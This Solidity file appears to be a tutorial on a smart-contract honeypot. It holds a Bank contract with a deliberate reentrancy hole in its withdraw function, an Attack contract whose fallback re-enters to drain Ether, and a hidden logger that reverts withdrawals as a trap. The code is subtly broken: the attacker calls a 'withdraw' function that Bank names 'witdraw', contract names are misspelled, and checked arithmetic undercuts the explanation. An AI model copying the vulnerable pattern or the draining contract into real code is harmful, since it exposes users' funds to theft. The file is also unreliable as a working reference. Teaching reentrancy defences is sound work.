// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.24;

//Honeypot is a trap to catch hackers.

//Vulnerability

//Combining two exploits, reentrancy and hindin malicious code, we can build a contract

/*
Bank is a contract that calls Logger to log events.
Bank.withdraw() is vulnerable to the reentrancy attack.
So a hacker tries to drain Ether from Bank.
But actually the reentracy exploit is a bait for hackers.
By deploying Bank with HoneyPot in place of the Logger, this contract becomes
a trap for hackers. Let's see how.

1. Alice deploys HoneyPot
2. Alice deploys Bank with the address of HoneyPot
3. Alice deposits 1 Ether into Bank.
4. Eve discovers the reentrancy exploit in Bank.withdraw and decides to hack it.
5. Eve deploys Attack with the address of Bank
6. Eve calls Attack.attack() with 1 Ether but the transaction fails.

What happened?
Eve calls Attack.attack() and it starts withdrawing Ether from Bank.
When the last Bank.withdraw() is about to complete, it calls logger.log().
Logger.log() calls HoneyPot.log() and reverts. Transaction fails.
*/

contract Bank {
    mapping(address => uint256) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function witdraw(uint256 _amount) public {
        require(_amount <= balances[msg.sender], "Insuffciant Balance");
        (bool sent,) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to sent Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint256 amount, string action);

    function log(address _caller, uint256 _amount, string memory _action) public {
        emit Log(_caller, _amount, _action);
    }
}

//Hacker tries to drain the Ethers stroed in the Bank by reeentrancy.

contract Attact {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.witdraw(1 ether);
        }
    }

    function attact() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

//Lets' say this is in a separate file so that others cannot read it
contract HonePot {
    function log(address _caller, uint256 _amount, string memory _action) public {
        if (equal(_action, "Withdraw")) {
            revert("Its a trap");
        }
    }

    //function to compare strings using kacck256
    function equal(string memory a, string memory b) public pure returns (bool) {
        return keccak256(abi.encode(a)) == keccak256(abi.encode(b));
    }
}
